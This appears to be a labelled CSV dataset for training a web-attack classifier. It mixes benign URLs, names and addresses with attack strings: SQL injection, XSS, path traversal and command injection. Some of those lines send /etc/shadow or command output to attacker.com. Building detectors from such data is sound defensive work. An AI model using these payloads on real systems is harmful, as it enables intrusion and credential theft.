payload,label
-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723,1
/login?redirect_url=/dashboard/user/593800,0
5655366857246860,0
/assets/style.css?user=profile468,0
atractivo,0
/login?redirect_url=/dashboard/user/841273,0
sedano montanyola,0
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('pufu' like 'pufu",1
iago,0
34,0
trimble.scelzo@todomodelos.al,0
aimarsen@enla.gi,0
/login?redirect_url=/dashboard/user/430739,0
"-2314"")) or make_set(9354=9354,7185) and ((""uatq"" like ""uatq",1
8466,0
/api/v1/auth?token=aoebMe7y,0
"emilio arrieta, 110, 1f",0
/api/v1/auth?token=X3F5E1Y3,0
/login?redirect_url=/dashboard/user/191882,0
1686991353142188,0
/login.html?q=profile218,0
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""pnub""=""pnub",1
& ps -ef,1
branchadell arribas,0
"| wget http://attacker.com --header=""X-Data: $(id)""",1
3772,0
/product/detail?q=hải47,0
atlntica,0
| ping -n 20 127.0.0.1,1
/api/v1/users?user=admin752,0
2x334ma81va,0
tabar,0
/login?redirect_url=/dashboard/user/182643,0
/login.html?user=admin939,0
novisedl9,0
/product?id=811426&utm_source=facebook&campaign=sale,0
\u003C,1
64079837c,0
ch35isca,0
/product?id=980588&utm_source=facebook&campaign=sale,0
-3861') as zmja where 4036=4036 or 9323=9323#,1
/index.php?user=2026903,0
lizana rom,0
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
1') and sleep(5) and ('xecl' like 'xecl,1
/search?token=apple650,0
swinks8,0
lewes,0
lynnell,0
"-9526 where 5734=5734 or elt(1032=1032,3623)--",1
"-6357"") order by 1--",1
/api/v1/users?user=2026642,0
"plza. magallanes, 50",0
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1
"1'||(select 'bgdh' from dual where 1967=1967;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
fowler,0
03621656f,0
/api/v1/auth?token=i17lqqfC,0
torcuarto,0
mazzotti9@novaservicios.bi,0
apartadero,0
">""<IMG STYLE=""CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)"">",1
"-5143'+(select 'zyrr' where 8405=8405 union all select 8405,8405,8405,8405#",1
"1"") where 2180=2180 and make_set(8403=8403,8899)--",1
tr?abal,0
"-1401"")) union all select 3480,3480,3480,3480,3480,3480--",1
2502,0
girabal sabaters,0
71,0
/api/v1/users?q=apple645,0
32783648t,0
/home?page=profile200,0
10817,0
6144624878722444,0
/./../../../../../.{file},1
/index.php?page=shoes438,0
de5peadura,0
; nslookup $(id).attacker.com,1
oskorep,0
-8465' where 5242=5242 or 3806=7423--,1
////../../../../{file},1
/product?id=535026&utm_source=facebook&campaign=sale,0
/assets/style.css?q=book705,0
/api/v1/auth?token=J5yRHunp,0
"plaza luis pombo, s/n 9?g",0
; host $(whoami).attacker.com,1
/login?redirect_url=/dashboard/user/948130,0
/login.html?page=2026285,0
"calle poligon industrial ""el segre"", 118",0
6516910925369020,0
60586849l,0
/team/verona/9zE45A3M/statistics,0
79856305y,0
7857158360903973,0
6053,0
"c/ leopoldo alas ""clarin"" 4, 6?b",0
/product?id=917000&utm_source=facebook&campaign=sale,0
1')) and 3355=6012 and (('ofmy'='ofmy,1
"c/ meson de jativa, 109 10-a",0
-3497' order by 1#,1
deshon7oso,0
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,1
/home?id=shoes292,0
bizantina,0
/api/v1/auth?token=VZib8Hi9,0
"exp(~(select * from (select concat(0x7171706a71,(select (elt(1049=1049,1))),0x717a767a71,0x78))x))",1
6435,0
/login?redirect_url=/dashboard/user/240068,0
tamerlani@ubikuo.cc,0
/api/v1/auth?token=XqMOw0F7,0
/index.php?token=hải623,0
(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual),1
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">",1
"1%""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",1
ech5d7,0
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",1
27268,0
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('ineq' like 'ineq,1
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
7043934218522889,0
allegra,0
1');begin user_lock.sleep(5); end--,1
/team/verona/3iP8kgxR/statistics,0
2l04a8,0
"-3853"") where 4626=4626 union all select 4626,4626,4626--",1
23978164c,0
jeria cifr,0
/login.html?category=123657,0
/login.html?id=hải359,0
19192,0
09640,0
/assets/style.css?token=kma769,0
-6680') or 5483=3031 and ('zxes'='zxes,1
64721683m,0
"1%""));if(7899=7899) select 7899 else drop function zbbp--",1
; %77%68%6f%61%6d%69,1
"-4541"")) or make_set(4821=5233,5233) and ((""xfex""=""xfex",1
/api/v1/users?user=admin328,0
%0aid,1
rabs,0
garcilln,0
"1'+(select 'ixvd' where 4772=4772 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",1
5881598906156737,0
/product?id=411095&utm_source=facebook&campaign=sale,0
raspar,0
/product/detail?q=shoes536,0
rowan_oldman@kpincentives.pn,0
clovis,0
ba3ce79,0
/product?id=802338&utm_source=facebook&campaign=sale,0
bianchetti@zafranet.se,0
/home?q=apple853,0
36563093q,0
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"1"")));select benchmark(5000000,md5(0x714e4153))#",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
"1"")) as aozi where 3354=3354 waitfor delay '0:0:5'--",1
29056,0
/api/v1/auth?token=JZO88lCA,0
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",1
belver,0
"1"")) as tpeh where 6306=6306 and 5965=5806#",1
vreugden,0
0a04ale53,0
01246496b,0
1) where 7552=7552 order by 1#,1
ippolito,0
/home?category=admin972,0
/home?token=apple926,0
/api/v1/users?token=kma487,0
/index.php?user=12331,0
inda,0
1')) or 6793=(select 6793 from pg_sleep(5)) and (('qiau'='qiau,1
fructferamente,0
towaij,0
huesca,0
casabermeja,0
"1,(case when 8260=8260 then 1 else null end)",1
"calle secretario aguilar 196, 4-c",0
& dig $(hostname).attacker.com,1
"-1487"") as crfi where 2407=2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1
salip altares,0
binder gene,0
"calle can puigdorfila 41, 2?g",0
/product?id=902251&utm_source=facebook&campaign=sale,0
/search?id=2026787,0
"1'))) and 8635=(select count(*) from generate_series(1,5000000))--",1
/product?id=150111&utm_source=facebook&campaign=sale,0
edel,0
9061531800144737,0
49893169m,0
"| curl -d ""data=$(whoami)"" http://attacker.com/receive",1
/login?redirect_url=/dashboard/user/426529,0
/api/v1/auth?token=dtczMCkk,0
recincho,0
2244921574247376,0
almaluez,0
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('xzlx' like 'xzlx",1
1' where 7882=7882 and 6663=4524--,1
san martn y mudrin,0
calle puerto de alcolea 185 9-e,0
"1"") where 6897=6897;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
domenge canelas,0
/login?redirect_url=/dashboard/user/252412,0
"1"");select (case when (1868=5071) then 1 else 1868*(select 1868 from master..sysdatabases) end)--",1
wynnie,0
afan2do,0
/index.php?token=profile741,0
1') or 6793=(select 6793 from pg_sleep(5)) and ('fuvv'='fuvv,1
sonriente,0
/product/detail?user=kma123,0
/api/v1/users?token=contact753,0
5934470269440414,0
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
41392002y,0
2708595320895470,0
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1
/product/detail?user=profile122,0
"1"") where 1410=1410;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
/assets/style.css?q=2026212,0
barranco,0
innes,0
puges crcamo,0
gwohsing,0
/team/verona/u6OkhjJM/statistics,0
30731993z,0
"1"") where 5850=5850 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
/search?id=123927,0
'; whoami; /*,1
dowd,0
"1)) as potk where 5040=5040 or elt(5873=5873,sleep(5))#",1
agraviamiento,0
blankenship@likeanangel.tc,0
">""<br size=""&{document.cookie=true}"">",1
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",1
/api/v1/auth?token=gDtT6zQM,0
"1"" where 9973=9973 and 2006=2006",1
1'||(select 'sxya' where 3578=3578;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
/index.php?token=apple446,0
<img/src='x'/onerror='alert(1)'/>,1
28287163s,0
"1')) as babx where 2494=2494 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
orbegoso,0
06589147s,0
t6t2lado,0
pujals ogando,0
"1"");select case when 7717=7717 then 1 else null end--",1
1%') or sleep(5) and ('%'=',1
6708008477094577,0
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
alvaro-pagano@hiperpapel.an,0
/assets/style.css?token=admin982,0
/login?redirect_url=/dashboard/user/560059,0
ensminge,0
/login.html?user=profile812,0
/login?redirect_url=/dashboard/user/58745,0
/api/v1/users?user=profile826,0
/product?id=2693&utm_source=facebook&campaign=sale,0
95690740e,0
havis,0
su0r6s09,0
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
22430,0
conde,0
4l09o636a,0
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
7656,0
licinio,0
a99b3do,0
whiteside.seyfferrtitz@cohel.uk,0
; whoa\mi,1
logr_era,0
hemisfero,0
/product?id=821839&utm_source=facebook&campaign=sale,0
"-4606"") as elek where 8261=8261 or 8571=8571--",1
"1));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((7749=7749",1
condado de trevio,0
mango_rizzo1@premiostv.ky,0
/team/verona/kTrALSK4/statistics,0
"<body onfocus=""location='javascrpt:alert(1) >123",1
/login.html?category=2026599,0
"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",1
clodomiro,0
"1%"")) and (select * from (select(sleep(5)))fzno) and ((""%""=""",1
escal,0
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",1
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc",1
/search?token=apple935,0
78717162f,0
landau silvestre,0
/product?id=309257&utm_source=facebook&campaign=sale,0
/product?id=323511&utm_source=facebook&campaign=sale,0
"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",1
\uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)',1
"plza. arbizketa 129,",0
/api/v1/auth?token=TzSWJDKi,0
&& ls -la,1
victoria de los angeles,0
p57at84o,0
1') and 7533=7533 and ('cryr'='cryr,1
nidya,0
levitin,0
"don quijote 81,",0
/product/detail?id=book442,0
"1) as wvpl where 9791=9791 and make_set(3491=9067,9067)--",1
">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>",1
/api/v1/users?category=admin453,0
castell sargatal,0
/team/verona/L4AIfHg6/statistics,0
"1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",1
/product?id=621247&utm_source=facebook&campaign=sale,0
/product/detail?id=apple587,0
"-4964"")) union all select 4750,4750,4750,4750,4750--",1
"1%') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='",1
6210304125395954,0
sauvanelex@gaudio.lk,0
/home?id=shoes418,0
&#0060;,1
1 where 8102=8102 and 9198=9198--,1
d1pre3dad3r,0
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
/api/v1/auth?token=XUqZkmgj,0
&& curl -X POST -d @/etc/shadow http://attacker.com/receive,1
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
/api/v1/auth?token=b7Ny6EnV,0
1' and 8594=(select 8594 from pg_sleep(5))--,1
41960,0
plza. taboada chivite 32 5?b,0
31439,0
"1"") and elt(4249=4249,7259) and (""upkx""=""upkx",1
/assets/style.css?category=profile690,0
"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu",1
lihun,0
/login?redirect_url=/dashboard/user/654435,0
de5pi6ar4za4,0
"1"")) and sleep(5)#",1
albegar,0
estribor 86 2-g,0
/login.html?id=kma715,0
1') and (7603=3634)*3634,1
/team/verona/DSpiEW4S/statistics,0
/index.php?token=2026364,0
"1 where 9083=9083 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
carrer de merida 35 8-c,0
mang,0
/login?redirect_url=/dashboard/user/15041,0
50513,0
glaser,0
loganiceo,0
antulio,0
lores bigas,0
bergland,0
torrelles de foix,0
/api/v1/users?id=apple704,0
/product/detail?category=apple593,0
"1'||(select 'xhqy' where 4531=4531 union all select null,null--",1
/search?user=admin156,0
/product/detail?page=admin821,0
"-7008')) union all select 9080,9080,9080#",1
'|| whoami || echo ',1
25727,0
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr",1
/login.html?q=profile691,0
pistan robredo,0
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",1
09352334m,0
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",1
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph",1
ellswort,0
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao",1
/product?id=286853&utm_source=facebook&campaign=sale,0
bose,0
"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""grct""=""grct",1
iwasaki@chaqueta.com.asia,0
/home?category=2026887,0
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",1
laws cabezon,0
/team/verona/QQ4D3ykh/statistics,0
-hatajador,0
willetta,0
'/*,1
5ifi3a2i05,0
/login.html?page=kma72,0
/home?user=admin660,0
addie@logiteclines.zm,0
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",1
4108422495216222,0
-6500')) or (8459=8459)*4906 and (('padu' like 'padu,1
40467,0
"calle de las abejorreras 29, 4a",0
"1') union all select null,null,null,null,null,null,null,null,null--",1
5092047047326643,0
ketchum,0
"1' in boolean mode) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)#",1
despault2,0
calb fermoselle,0
marla,0
alpanseque,0
/login?redirect_url=/dashboard/user/385627,0
raha,0
"1"" where 8918=8918 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""qkds"" like ""qkds",1
casasnova vadal,0
/login.html?token=123100,0
/api/v1/auth?token=WXtINxvi,0
1' and 6969=(select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa,1
7098,0
"robert graves, 101",0
/api/v1/auth?token=bPKzjLYt,0
lohr@show.nom.ad,0
/login?redirect_url=/dashboard/user/90350,0
demstenes,0
/login?redirect_url=/dashboard/user/368445,0
/team/verona/5qw4aQAW/statistics,0
"1';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1"");(select * from (select(sleep(5)))acdk)#",1
polop,0
/index.php?q=shoes617,0
/product?id=755533&utm_source=facebook&campaign=sale,0
0650065659557709,0
willa,0
jocs olimpics 110 1-b,0
1'));select pg_sleep(5) and (('enpn' like 'enpn,1
"-4005' where 3963=3963 or elt(1032=1032,3623)--",1
&& ls,1
/assets/style.css?id=2026236,0
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
kipp,0
"c/ galicia, 180,",0
68438440p,0
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",1
/search?page=admin728,0
agoz0086,0
pl. herrera de los navarros 68 12-h,0
stalin,0
"-7043"") where 9755=9755 union all select 9755,9755,9755,9755,9755,9755#",1
5013,0
7$34mon3a5,0
maridel,0
/assets/style.css?token=admin795,0
/api/v1/users?q=apple200,0
deloria,0
/product?id=874242&utm_source=facebook&campaign=sale,0
"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>",1
41110,0
fabrelle,0
noye,0
/index.php?user=apple18,0
/api/v1/users?category=kma397,0
talmadge@movintel.uz,0
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""xxug""=""xxug",1
angelika,0
2881,0
| id,1
1');(select * from (select(sleep(5)))srmq) and ('pags'='pags,1
-7770' where 6503=6503 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
moll aybar,0
/api/v1/auth?token=IgvaGliK,0
hervidor,0
/index.php?user=123757,0
"1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",1
carretera 400 al km. 9 del km. 4 valldemossa 135,0
doct4r9miento,0
asme,0
"av. italia, 66, 4-a",0
knyht9@aspirantes.lt,0
9999685362950353,0
/login?redirect_url=/dashboard/user/340831,0
/home?id=contact204,0
/login.html?page=profile693,0
lugo,0
5emic0e,0
1')) and 3814=4272--,1
/team/verona/XUqZkmgj/statistics,0
dans,0
jamn ibrico,0
10261,0
gahan,0
"1'+(select lhtn where 8484=8484 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",1
/home?token=2026455,0
"lola flores, 98 3?h",0
"c/ juan ramon jimenez, 135, 11d",0
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1
9978092999259297,0
/login?redirect_url=/dashboard/user/235240,0
97233442e,0
/index.php?token=book947,0
"1'))) or elt(5873=5873,sleep(5))#",1
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'kwhs' like 'kwhs",1
yescas feal,0
